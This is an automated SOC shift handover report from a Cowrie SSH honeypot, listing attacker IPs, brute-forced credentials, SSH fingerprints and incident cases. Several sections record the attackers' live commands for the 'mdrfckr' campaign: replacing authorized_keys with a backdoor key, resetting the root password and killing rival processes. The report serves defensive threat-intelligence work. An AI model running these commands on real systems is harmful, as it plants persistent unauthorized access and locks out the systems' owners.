# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-23 |
| **Generated At** | 2026-04-23T19:17:40Z |
| **Shift Time** | 19:17 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **150** |
| Confirmed Threats | **93** |
| False Positives Filtered | **57** (38.0%) |
| Unique Attacker IPs | **7** |
| Countries of Origin | **3** |
| High Severity Cases | **30** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **120** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **58** |
| Unique Credential Pairs | **32** |
| Unique Usernames | **15** |
| Unique Passwords | **31** |
| Successful Auth Pairs | **18** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 30 |
| `345gs5662d34` | 14 |
| `ubuntu` | 2 |
| `daniel` | 1 |
| `user` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 14 |
| `345gs5662d34` | 14 |
| `123` | 2 |
| `Admin123456789..` | 1 |
| `qwerty123!` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 14 |
| `345gs5662d34` | `345gs5662d34` | 14 |
| `root` | `Admin123456789..` | 1 |
| `root` | `qwerty123!` | 1 |
| `root` | `1234qwerASDF` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Admin123456789..` | `101.126.54.167` | 2026-04-23T17:45:25 |
| `root` | `3245gs5662d34` | `101.126.54.167` | 2026-04-23T17:45:38 |
| `root` | `qwerty123!` | `101.126.54.167` | 2026-04-23T17:54:19 |
| `root` | `1234qwerASDF` | `101.126.54.167` | 2026-04-23T18:09:33 |
| `root` | `123Password` | `189.194.140.170` | 2026-04-23T18:33:28 |
| `root` | `3245gs5662d34` | `189.194.140.170` | 2026-04-23T18:33:35 |
| `root` | `Aa112211.` | `189.194.140.170` | 2026-04-23T18:37:22 |
| `root` | `a1b2c3d4` | `189.194.140.170` | 2026-04-23T18:38:20 |
| `root` | `Root@1234` | `189.194.140.170` | 2026-04-23T18:39:18 |
| `root` | `Ht123456.` | `189.194.140.170` | 2026-04-23T18:43:10 |
| `root` | `1234qwer!!` | `189.194.140.170` | 2026-04-23T18:44:07 |
| `root` | `Root1!@#` | `189.194.140.170` | 2026-04-23T18:45:06 |
| `root` | `root8888@123` | `189.194.140.170` | 2026-04-23T18:46:08 |
| `root` | `teste123` | `189.194.140.170` | 2026-04-23T18:50:02 |
| `root` | `Root2020#` | `189.194.140.170` | 2026-04-23T18:52:58 |
| `root` | `Qwe-1234` | `189.194.140.170` | 2026-04-23T18:54:54 |
| `root` | `P@ssw0rd4!` | `189.194.140.170` | 2026-04-23T18:55:51 |
| `root` | `nPSpP4PBW0` | `189.194.140.170` | 2026-04-23T18:56:49 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **150** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 124 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2e631bcdf023...` | Mirai/variant | 55 | 1 |
| `af8223ac9914...` | libssh-based | 53 | 1 |
| `03a80b21afa8...` | Modern SSH client | 14 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2e631bcdf023...` | libssh | 55 | 1 | Mirai/variant |
| `af8223ac9914...` | libssh | 53 | 1 | libssh-based |
| `03a80b21afa8...` | libssh | 14 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 2 | 2 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 14 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:LcGXUnMpjO9g"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.126.54.167`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `101.126.54.167`, `189.194.140.170`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **7** |
| Unique ASNs | **7** |
| High-Risk ASNs | **4** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |
| `AS63949` | Akamai Connected Cloud | 1 | LOW |
| `AS13999` | Mega Cable, S.A. de C.V. | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | LOW |
| `AS4134` | CHINANET BACKBONE | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (30)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b0feb6400b60

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]167` |
| **First Seen** | 2026-04-23 17:45 |
| **Last Seen** | 2026-04-23 17:45 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 17:45:24` | `cowrie.session.connect` |
| `2026-04-23 17:45:24` | `cowrie.client.version` |
| `2026-04-23 17:45:24` | `cowrie.client.kex` |
| `2026-04-23 17:45:25` | `cowrie.login.success` |
| `2026-04-23 17:45:26` | `cowrie.session.params` |
| `2026-04-23 17:45:26` | `cowrie.command.input` |
| `2026-04-23 17:45:26` | `cowrie.command.failed` |
| `2026-04-23 17:45:27` | `cowrie.log.closed` |
| `2026-04-23 17:45:27` | `cowrie.session.params` |
| `2026-04-23 17:45:27` | `cowrie.command.input` |
| `2026-04-23 17:45:27` | `cowrie.session.file_download` |
| `2026-04-23 17:45:27` | `cowrie.log.closed` |
| `2026-04-23 17:45:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]167` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dcb97d37208

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]167` |
| **First Seen** | 2026-04-23 17:45 |
| **Last Seen** | 2026-04-23 17:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 17:45:34` | `cowrie.session.connect` |
| `2026-04-23 17:45:34` | `cowrie.client.version` |
| `2026-04-23 17:45:34` | `cowrie.client.kex` |
| `2026-04-23 17:45:38` | `cowrie.login.success` |
| `2026-04-23 17:45:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]167` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92773896fb4d

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]167` |
| **First Seen** | 2026-04-23 17:54 |
| **Last Seen** | 2026-04-23 17:54 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:LcGXUnMpjO9g"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 17:54:18` | `cowrie.session.connect` |
| `2026-04-23 17:54:18` | `cowrie.client.version` |
| `2026-04-23 17:54:18` | `cowrie.client.kex` |
| `2026-04-23 17:54:19` | `cowrie.login.success` |
| `2026-04-23 17:54:20` | `cowrie.session.params` |
| `2026-04-23 17:54:20` | `cowrie.command.input` |
| `2026-04-23 17:54:20` | `cowrie.command.failed` |
| `2026-04-23 17:54:20` | `cowrie.log.closed` |
| `2026-04-23 17:54:20` | `cowrie.session.params` |
| `2026-04-23 17:54:20` | `cowrie.command.input` |
| `2026-04-23 17:54:20` | `cowrie.session.file_download` |
| `2026-04-23 17:54:20` | `cowrie.log.closed` |
| `2026-04-23 17:54:31` | `cowrie.session.params` |
| `2026-04-23 17:54:31` | `cowrie.command.input` |
| `2026-04-23 17:54:31` | `cowrie.log.closed` |
| `2026-04-23 17:54:32` | `cowrie.session.params` |
| `2026-04-23 17:54:32` | `cowrie.command.input` |
| `2026-04-23 17:54:32` | `cowrie.log.closed` |
| `2026-04-23 17:54:32` | `cowrie.session.params` |
| `2026-04-23 17:54:32` | `cowrie.command.input` |
| `2026-04-23 17:54:32` | `cowrie.session.file_download` |
| `2026-04-23 17:54:32` | `cowrie.log.closed` |
| `2026-04-23 17:54:33` | `cowrie.session.params` |
| `2026-04-23 17:54:33` | `cowrie.command.input` |
| `2026-04-23 17:54:33` | `cowrie.log.closed` |
| `2026-04-23 17:54:33` | `cowrie.session.params` |
| `2026-04-23 17:54:33` | `cowrie.command.input` |
| `2026-04-23 17:54:34` | `cowrie.log.closed` |
| `2026-04-23 17:54:34` | `cowrie.session.params` |
| `2026-04-23 17:54:34` | `cowrie.command.input` |
| `2026-04-23 17:54:34` | `cowrie.command.input` |
| `2026-04-23 17:54:34` | `cowrie.log.closed` |
| `2026-04-23 17:54:34` | `cowrie.session.params` |
| `2026-04-23 17:54:34` | `cowrie.command.input` |
| `2026-04-23 17:54:35` | `cowrie.log.closed` |
| `2026-04-23 17:54:35` | `cowrie.session.params` |
| `2026-04-23 17:54:35` | `cowrie.command.input` |
| `2026-04-23 17:54:36` | `cowrie.log.closed` |
| `2026-04-23 17:54:36` | `cowrie.session.params` |
| `2026-04-23 17:54:36` | `cowrie.command.input` |
| `2026-04-23 17:54:36` | `cowrie.log.closed` |
| `2026-04-23 17:54:37` | `cowrie.session.params` |
| `2026-04-23 17:54:37` | `cowrie.command.input` |
| `2026-04-23 17:54:37` | `cowrie.log.closed` |
| `2026-04-23 17:54:38` | `cowrie.session.params` |
| `2026-04-23 17:54:38` | `cowrie.command.input` |
| `2026-04-23 17:54:38` | `cowrie.log.closed` |
| `2026-04-23 17:54:38` | `cowrie.session.params` |
| `2026-04-23 17:54:38` | `cowrie.command.input` |
| `2026-04-23 17:54:38` | `cowrie.log.closed` |
| `2026-04-23 17:54:39` | `cowrie.session.params` |
| `2026-04-23 17:54:39` | `cowrie.command.input` |
| `2026-04-23 17:54:40` | `cowrie.log.closed` |
| `2026-04-23 17:54:40` | `cowrie.session.params` |
| `2026-04-23 17:54:40` | `cowrie.command.input` |
| `2026-04-23 17:54:40` | `cowrie.log.closed` |
| `2026-04-23 17:54:41` | `cowrie.session.params` |
| `2026-04-23 17:54:41` | `cowrie.command.input` |
| `2026-04-23 17:54:41` | `cowrie.log.closed` |
| `2026-04-23 17:54:42` | `cowrie.session.params` |
| `2026-04-23 17:54:42` | `cowrie.command.input` |
| `2026-04-23 17:54:42` | `cowrie.log.closed` |
| `2026-04-23 17:54:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]167` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf237f7fe2da

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]167` |
| **First Seen** | 2026-04-23 18:09 |
| **Last Seen** | 2026-04-23 18:09 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:MQExtimJDRnJ"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:09:32` | `cowrie.session.connect` |
| `2026-04-23 18:09:32` | `cowrie.client.version` |
| `2026-04-23 18:09:32` | `cowrie.client.kex` |
| `2026-04-23 18:09:33` | `cowrie.login.success` |
| `2026-04-23 18:09:34` | `cowrie.session.params` |
| `2026-04-23 18:09:34` | `cowrie.command.input` |
| `2026-04-23 18:09:34` | `cowrie.command.failed` |
| `2026-04-23 18:09:34` | `cowrie.log.closed` |
| `2026-04-23 18:09:35` | `cowrie.session.params` |
| `2026-04-23 18:09:35` | `cowrie.command.input` |
| `2026-04-23 18:09:35` | `cowrie.session.file_download` |
| `2026-04-23 18:09:35` | `cowrie.log.closed` |
| `2026-04-23 18:09:47` | `cowrie.session.params` |
| `2026-04-23 18:09:47` | `cowrie.command.input` |
| `2026-04-23 18:09:47` | `cowrie.log.closed` |
| `2026-04-23 18:09:48` | `cowrie.session.params` |
| `2026-04-23 18:09:48` | `cowrie.command.input` |
| `2026-04-23 18:09:48` | `cowrie.log.closed` |
| `2026-04-23 18:09:48` | `cowrie.session.params` |
| `2026-04-23 18:09:48` | `cowrie.command.input` |
| `2026-04-23 18:09:48` | `cowrie.session.file_download` |
| `2026-04-23 18:09:48` | `cowrie.log.closed` |
| `2026-04-23 18:09:49` | `cowrie.session.params` |
| `2026-04-23 18:09:49` | `cowrie.command.input` |
| `2026-04-23 18:09:49` | `cowrie.log.closed` |
| `2026-04-23 18:09:50` | `cowrie.session.params` |
| `2026-04-23 18:09:50` | `cowrie.command.input` |
| `2026-04-23 18:09:50` | `cowrie.log.closed` |
| `2026-04-23 18:09:50` | `cowrie.session.params` |
| `2026-04-23 18:09:50` | `cowrie.command.input` |
| `2026-04-23 18:09:50` | `cowrie.command.input` |
| `2026-04-23 18:09:50` | `cowrie.log.closed` |
| `2026-04-23 18:09:50` | `cowrie.session.params` |
| `2026-04-23 18:09:50` | `cowrie.command.input` |
| `2026-04-23 18:09:51` | `cowrie.log.closed` |
| `2026-04-23 18:09:51` | `cowrie.session.params` |
| `2026-04-23 18:09:51` | `cowrie.command.input` |
| `2026-04-23 18:09:52` | `cowrie.log.closed` |
| `2026-04-23 18:09:52` | `cowrie.session.params` |
| `2026-04-23 18:09:52` | `cowrie.command.input` |
| `2026-04-23 18:09:52` | `cowrie.log.closed` |
| `2026-04-23 18:09:52` | `cowrie.session.params` |
| `2026-04-23 18:09:52` | `cowrie.command.input` |
| `2026-04-23 18:09:53` | `cowrie.log.closed` |
| `2026-04-23 18:09:54` | `cowrie.session.params` |
| `2026-04-23 18:09:54` | `cowrie.command.input` |
| `2026-04-23 18:09:54` | `cowrie.log.closed` |
| `2026-04-23 18:09:55` | `cowrie.session.params` |
| `2026-04-23 18:09:55` | `cowrie.command.input` |
| `2026-04-23 18:09:55` | `cowrie.log.closed` |
| `2026-04-23 18:09:55` | `cowrie.session.params` |
| `2026-04-23 18:09:55` | `cowrie.command.input` |
| `2026-04-23 18:09:56` | `cowrie.log.closed` |
| `2026-04-23 18:09:56` | `cowrie.session.params` |
| `2026-04-23 18:09:56` | `cowrie.command.input` |
| `2026-04-23 18:09:56` | `cowrie.log.closed` |
| `2026-04-23 18:09:57` | `cowrie.session.params` |
| `2026-04-23 18:09:57` | `cowrie.command.input` |
| `2026-04-23 18:09:57` | `cowrie.log.closed` |
| `2026-04-23 18:09:57` | `cowrie.session.params` |
| `2026-04-23 18:09:57` | `cowrie.command.input` |
| `2026-04-23 18:09:58` | `cowrie.log.closed` |
| `2026-04-23 18:09:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]167` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f64afe2e386b

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:33 |
| **Last Seen** | 2026-04-23 18:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:33:26` | `cowrie.session.connect` |
| `2026-04-23 18:33:26` | `cowrie.client.version` |
| `2026-04-23 18:33:27` | `cowrie.client.kex` |
| `2026-04-23 18:33:28` | `cowrie.login.success` |
| `2026-04-23 18:33:29` | `cowrie.session.params` |
| `2026-04-23 18:33:29` | `cowrie.command.input` |
| `2026-04-23 18:33:29` | `cowrie.command.failed` |
| `2026-04-23 18:33:29` | `cowrie.log.closed` |
| `2026-04-23 18:33:30` | `cowrie.session.params` |
| `2026-04-23 18:33:30` | `cowrie.command.input` |
| `2026-04-23 18:33:30` | `cowrie.session.file_download` |
| `2026-04-23 18:33:30` | `cowrie.log.closed` |
| `2026-04-23 18:33:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11fc6f1fcb57

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:33 |
| **Last Seen** | 2026-04-23 18:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:33:33` | `cowrie.session.connect` |
| `2026-04-23 18:33:33` | `cowrie.client.version` |
| `2026-04-23 18:33:33` | `cowrie.client.kex` |
| `2026-04-23 18:33:35` | `cowrie.login.success` |
| `2026-04-23 18:33:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c37281a59e37

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:37 |
| **Last Seen** | 2026-04-23 18:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:37:21` | `cowrie.session.connect` |
| `2026-04-23 18:37:21` | `cowrie.client.version` |
| `2026-04-23 18:37:21` | `cowrie.client.kex` |
| `2026-04-23 18:37:22` | `cowrie.login.success` |
| `2026-04-23 18:37:23` | `cowrie.session.params` |
| `2026-04-23 18:37:23` | `cowrie.command.input` |
| `2026-04-23 18:37:23` | `cowrie.command.failed` |
| `2026-04-23 18:37:23` | `cowrie.log.closed` |
| `2026-04-23 18:37:24` | `cowrie.session.params` |
| `2026-04-23 18:37:24` | `cowrie.command.input` |
| `2026-04-23 18:37:24` | `cowrie.session.file_download` |
| `2026-04-23 18:37:24` | `cowrie.log.closed` |
| `2026-04-23 18:37:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2253766accf6

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:37 |
| **Last Seen** | 2026-04-23 18:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

